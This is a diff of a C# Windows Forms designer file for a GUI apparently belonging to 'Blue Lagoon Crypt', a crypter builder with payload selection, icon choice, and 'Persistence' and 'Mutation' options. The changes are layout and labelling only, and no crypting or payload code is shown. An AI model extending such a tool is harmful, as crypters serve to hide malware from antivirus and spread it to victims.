@@ -28,6 +28,7 @@
         /// </summary>
         private void InitializeComponent()
         {
+            System.ComponentModel.ComponentResourceManager resources = new System.ComponentModel.ComponentResourceManager(typeof(Form1));
             this.button_select_server = new System.Windows.Forms.Button();
             this.server_path = new System.Windows.Forms.TextBox();
             this.button_select_icon = new System.Windows.Forms.Button();
@@ -52,9 +53,14 @@
             this.checkBox1 = new System.Windows.Forms.CheckBox();
             this.checkBox2 = new System.Windows.Forms.CheckBox();
             this.checkBox3 = new System.Windows.Forms.CheckBox();
+            this.pictureBoxSuccess = new System.Windows.Forms.PictureBox();
+            this.blueLagoonCryptHighlight = new System.Windows.Forms.Panel();
+            this.button_OpenNameForm = new System.Windows.Forms.Button();
+            this.OutputNameHolderLabel = new System.Windows.Forms.Label();
             this.windowPanel.SuspendLayout();
             ((System.ComponentModel.ISupportInitialize)(this.pictureBoxIcon)).BeginInit();
             ((System.ComponentModel.ISupportInitialize)(this.pictureBoxPayload)).BeginInit();
+            ((System.ComponentModel.ISupportInitialize)(this.pictureBoxSuccess)).BeginInit();
             this.SuspendLayout();
             // 
             // button_select_server
@@ -64,7 +70,7 @@
             this.button_select_server.ForeColor = System.Drawing.Color.White;
             this.button_select_server.Location = new System.Drawing.Point(200, 114);
             this.button_select_server.Name = "button_select_server";
-            this.button_select_server.Size = new System.Drawing.Size(380, 33);
+            this.button_select_server.Size = new System.Drawing.Size(185, 33);
             this.button_select_server.TabIndex = 0;
             this.button_select_server.Text = "Select";
             this.button_select_server.UseVisualStyleBackColor = true;
@@ -118,8 +124,9 @@
             this.windowPanel.Dock = System.Windows.Forms.DockStyle.Top;
             this.windowPanel.Location = new System.Drawing.Point(0, 0);
             this.windowPanel.Name = "windowPanel";
-            this.windowPanel.Size = new System.Drawing.Size(763, 41);
+            this.windowPanel.Size = new System.Drawing.Size(777, 41);
             this.windowPanel.TabIndex = 2;
+            this.windowPanel.Paint += new System.Windows.Forms.PaintEventHandler(this.windowPanel_Paint);
             this.windowPanel.MouseDown += new System.Windows.Forms.MouseEventHandler(this.mouseDown);
             // 
             // help_button
@@ -127,9 +134,9 @@
             this.help_button.FlatStyle = System.Windows.Forms.FlatStyle.Flat;
             this.help_button.Font = new System.Drawing.Font("Crafter", 13.8F, System.Drawing.FontStyle.Bold, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
             this.help_button.ForeColor = System.Drawing.Color.Black;
-            this.help_button.Location = new System.Drawing.Point(672, 5);
+            this.help_button.Location = new System.Drawing.Point(621, 7);
             this.help_button.Name = "help_button";
-            this.help_button.Size = new System.Drawing.Size(39, 31);
+            this.help_button.Size = new System.Drawing.Size(100, 31);
             this.help_button.TabIndex = 11;
             this.help_button.Text = "?";
             this.help_button.UseVisualStyleBackColor = true;
@@ -141,7 +148,7 @@
             // 
             this.exit_button.FlatStyle = System.Windows.Forms.FlatStyle.Flat;
             this.exit_button.Font = new System.Drawing.Font("Crafter", 13.8F, System.Drawing.FontStyle.Bold, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
-            this.exit_button.Location = new System.Drawing.Point(717, 5);
+            this.exit_button.Location = new System.Drawing.Point(731, 7);
             this.exit_button.Name = "exit_button";
             this.exit_button.Size = new System.Drawing.Size(39, 31);
             this.exit_button.TabIndex = 4;
@@ -162,18 +169,20 @@
             this.windowName.Size = new System.Drawing.Size(491, 49);
             this.windowName.TabIndex = 3;
             this.windowName.Text = "Blue Lagoon Crypt (WIP)";
-            this.windowName.Click += new System.EventHandler(this.label3_Click);
+            this.windowName.Click += new System.EventHandler(this.topLogoBLC_WIP_Click);
+            this.windowName.MouseEnter += new System.EventHandler(this.blueLagoonCryptEnter);
+            this.windowName.MouseLeave += new System.EventHandler(this.blueLagoonCryptLeave);
             // 
             // server_path_label
             // 
             this.server_path_label.AutoSize = true;
             this.server_path_label.Font = new System.Drawing.Font("Anita  Semi-square", 13.8F, System.Drawing.FontStyle.Bold, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
             this.server_path_label.ForeColor = System.Drawing.Color.White;
-            this.server_path_label.Location = new System.Drawing.Point(27, 84);
+            this.server_path_label.Location = new System.Drawing.Point(85, 83);
             this.server_path_label.Name = "server_path_label";
-            this.server_path_label.Size = new System.Drawing.Size(144, 27);
+            this.server_path_label.Size = new System.Drawing.Size(86, 27);
             this.server_path_label.TabIndex = 3;
-            this.server_path_label.Text = "Payload :";
+            this.server_path_label.Text = "Exe :";
             this.server_path_label.Click += new System.EventHandler(this.label1_Click);
             // 
             // icon_path_label
@@ -193,7 +202,7 @@
             this.button_build.FlatStyle = System.Windows.Forms.FlatStyle.Flat;
             this.button_build.Font = new System.Drawing.Font("Anita  Semi-square", 10.2F, System.Drawing.FontStyle.Bold, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
             this.button_build.ForeColor = System.Drawing.Color.White;
-            this.button_build.Location = new System.Drawing.Point(200, 554);
+            this.button_build.Location = new System.Drawing.Point(200, 576);
             this.button_build.Name = "button_build";
             this.button_build.Size = new System.Drawing.Size(380, 33);
             this.button_build.TabIndex = 0;
@@ -278,36 +287,35 @@
             // buildHighlight
             // 
             this.buildHighlight.BackColor = System.Drawing.Color.Black;
-            this.buildHighlight.Location = new System.Drawing.Point(206, 586);
+            this.buildHighlight.Location = new System.Drawing.Point(206, 608);
             this.buildHighlight.Name = "buildHighlight";
             this.buildHighlight.Size = new System.Drawing.Size(367, 5);
             this.buildHighlight.TabIndex = 10;
             // 
             // pictureBoxIcon
             // 
-            this.pictureBoxIcon.Location = new System.Drawing.Point(611, 175);
-            this.pictureBoxIcon.MinimumSize = new System.Drawing.Size(100, 100);
+            this.pictureBoxIcon.Location = new System.Drawing.Point(621, 198);
             this.pictureBoxIcon.Name = "pictureBoxIcon";
-            this.pictureBoxIcon.Size = new System.Drawing.Size(100, 100);
-            this.pictureBoxIcon.SizeMode = System.Windows.Forms.PictureBoxSizeMode.StretchImage;
+            this.pictureBoxIcon.Size = new System.Drawing.Size(100, 64);
+            this.pictureBoxIcon.SizeMode = System.Windows.Forms.PictureBoxSizeMode.CenterImage;
             this.pictureBoxIcon.TabIndex = 11;
             this.pictureBoxIcon.TabStop = false;
             // 
             // pictureBoxPayload
             // 
-            this.pictureBoxPayload.Location = new System.Drawing.Point(611, 69);
-            this.pictureBoxPayload.MinimumSize = new System.Drawing.Size(100, 100);
+            this.pictureBoxPayload.Location = new System.Drawing.Point(621, 83);
             this.pictureBoxPayload.Name = "pictureBoxPayload";
-            this.pictureBoxPayload.Size = new System.Drawing.Size(100, 100);
-            this.pictureBoxPayload.SizeMode = System.Windows.Forms.PictureBoxSizeMode.StretchImage;
+            this.pictureBoxPayload.Size = new System.Drawing.Size(100, 64);
+            this.pictureBoxPayload.SizeMode = System.Windows.Forms.PictureBoxSizeMode.CenterImage;
             this.pictureBoxPayload.TabIndex = 12;
             this.pictureBoxPayload.TabStop = false;
+            this.pictureBoxPayload.Click += new System.EventHandler(this.pictureBoxPayload_Click);
             // 
             // checkBoxPersistence
             // 
             this.checkBoxPersistence.AutoSize = true;
             this.checkBoxPersistence.ForeColor = System.Drawing.SystemColors.HighlightText;
-            this.checkBoxPersistence.Location = new System.Drawing.Point(200, 528);
+            this.checkBoxPersistence.Location = new System.Drawing.Point(200, 550);
             this.checkBoxPersistence.Name = "checkBoxPersistence";
             this.checkBoxPersistence.Size = new System.Drawing.Size(100, 20);
             this.checkBoxPersistence.TabIndex = 13;
@@ -318,7 +326,7 @@
             // 
             this.checkBox1.AutoSize = true;
             this.checkBox1.ForeColor = System.Drawing.SystemColors.HighlightText;
-            this.checkBox1.Location = new System.Drawing.Point(315, 528);
+            this.checkBox1.Location = new System.Drawing.Point(315, 550);
             this.checkBox1.Name = "checkBox1";
             this.checkBox1.Size = new System.Drawing.Size(96, 20);
             this.checkBox1.TabIndex = 14;
@@ -329,7 +337,7 @@
             // 
             this.checkBox2.AutoSize = true;
             this.checkBox2.ForeColor = System.Drawing.SystemColors.HighlightText;
-            this.checkBox2.Location = new System.Drawing.Point(422, 528);
+            this.checkBox2.Location = new System.Drawing.Point(422, 550);
             this.checkBox2.Name = "checkBox2";
             this.checkBox2.Size = new System.Drawing.Size(65, 20);
             this.checkBox2.TabIndex = 15;
@@ -340,19 +348,66 @@
             // 
             this.checkBox3.AutoSize = true;
             this.checkBox3.ForeColor = System.Drawing.SystemColors.HighlightText;
-            this.checkBox3.Location = new System.Drawing.Point(501, 528);
+            this.checkBox3.Location = new System.Drawing.Point(501, 550);
             this.checkBox3.Name = "checkBox3";
             this.checkBox3.Size = new System.Drawing.Size(79, 20);
             this.checkBox3.TabIndex = 16;
             this.checkBox3.Text = "Mutation";
             this.checkBox3.UseVisualStyleBackColor = true;
             // 
+            // pictureBoxSuccess
+            // 
+            this.pictureBoxSuccess.Image = global::Blue_Lagoon_Crypter__Windowed_.Properties.Resources.Success;
+            this.pictureBoxSuccess.InitialImage = ((System.Drawing.Image)(resources.GetObject("pictureBoxSuccess.InitialImage")));
+            this.pictureBoxSuccess.Location = new System.Drawing.Point(621, 345);
+            this.pictureBoxSuccess.MinimumSize = new System.Drawing.Size(100, 100);
+            this.pictureBoxSuccess.Name = "pictureBoxSuccess";
+            this.pictureBoxSuccess.Size = new System.Drawing.Size(100, 268);
+            this.pictureBoxSuccess.SizeMode = System.Windows.Forms.PictureBoxSizeMode.StretchImage;
+            this.pictureBoxSuccess.TabIndex = 17;
+            this.pictureBoxSuccess.TabStop = false;
+            this.pictureBoxSuccess.Visible = false;
+            // 
+            // blueLagoonCryptHighlight
+            // 
+            this.blueLagoonCryptHighlight.BackColor = System.Drawing.Color.Black;
+            this.blueLagoonCryptHighlight.Location = new System.Drawing.Point(0, 42);
+            this.blueLagoonCryptHighlight.Name = "blueLagoonCryptHighlight";
+            this.blueLagoonCryptHighlight.Size = new System.Drawing.Size(497, 5);
+            this.blueLagoonCryptHighlight.TabIndex = 18;
+            // 
+            // button_OpenNameForm
+            // 
+            this.button_OpenNameForm.FlatStyle = System.Windows.Forms.FlatStyle.Flat;
+            this.button_OpenNameForm.Font = new System.Drawing.Font("Anita  Semi-square", 10.2F, System.Drawing.FontStyle.Bold, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
+            this.button_OpenNameForm.ForeColor = System.Drawing.Color.White;
+            this.button_OpenNameForm.Location = new System.Drawing.Point(395, 114);
+            this.button_OpenNameForm.Name = "button_OpenNameForm";
+            this.button_OpenNameForm.Size = new System.Drawing.Size(185, 33);
+            this.button_OpenNameForm.TabIndex = 19;
+            this.button_OpenNameForm.Text = "Name";
+            this.button_OpenNameForm.UseVisualStyleBackColor = true;
+            this.button_OpenNameForm.Click += new System.EventHandler(this.button_OpenNameForm_Click);
+            // 
+            // OutputNameHolderLabel
+            // 
+            this.OutputNameHolderLabel.AutoSize = true;
+            this.OutputNameHolderLabel.Location = new System.Drawing.Point(367, 634);
+            this.OutputNameHolderLabel.Name = "OutputNameHolderLabel";
+            this.OutputNameHolderLabel.Size = new System.Drawing.Size(44, 16);
+            this.OutputNameHolderLabel.TabIndex = 20;
+            this.OutputNameHolderLabel.Text = "label1";
+            // 
             // Form1
             // 
             this.AutoScaleDimensions = new System.Drawing.SizeF(8F, 16F);
             this.AutoScaleMode = System.Windows.Forms.AutoScaleMode.Font;
             this.BackColor = System.Drawing.SystemColors.Desktop;
-            this.ClientSize = new System.Drawing.Size(763, 633);
+            this.ClientSize = new System.Drawing.Size(777, 659);
+            this.Controls.Add(this.OutputNameHolderLabel);
+            this.Controls.Add(this.button_OpenNameForm);
+            this.Controls.Add(this.blueLagoonCryptHighlight);
+            this.Controls.Add(this.pictureBoxSuccess);
             this.Controls.Add(this.checkBox3);
             this.Controls.Add(this.checkBox2);
             this.Controls.Add(this.checkBox1);
@@ -375,15 +430,17 @@
             this.Controls.Add(this.button_select_server);
             this.Controls.Add(this.buildHighlight);
             this.FormBorderStyle = System.Windows.Forms.FormBorderStyle.None;
+            this.Icon = ((System.Drawing.Icon)(resources.GetObject("$this.Icon")));
             this.MinimumSize = new System.Drawing.Size(0, 35);
             this.Name = "Form1";
             this.StartPosition = System.Windows.Forms.FormStartPosition.CenterScreen;
-            this.Text = "Form1";
+            this.Text = "Blue Lagoon Crypt [by lxcalbxy]";
             this.Load += new System.EventHandler(this.Form1_Load);
             this.windowPanel.ResumeLayout(false);
             this.windowPanel.PerformLayout();
             ((System.ComponentModel.ISupportInitialize)(this.pictureBoxIcon)).EndInit();
             ((System.ComponentModel.ISupportInitialize)(this.pictureBoxPayload)).EndInit();
+            ((System.ComponentModel.ISupportInitialize)(this.pictureBoxSuccess)).EndInit();
             this.ResumeLayout(false);
             this.PerformLayout();
 
@@ -415,6 +472,10 @@
         private System.Windows.Forms.CheckBox checkBox1;
         private System.Windows.Forms.CheckBox checkBox2;
         private System.Windows.Forms.CheckBox checkBox3;
+        private System.Windows.Forms.PictureBox pictureBoxSuccess;
+        private System.Windows.Forms.Panel blueLagoonCryptHighlight;
+        private System.Windows.Forms.Button button_OpenNameForm;
+        private System.Windows.Forms.Label OutputNameHolderLabel;
     }
 }
 
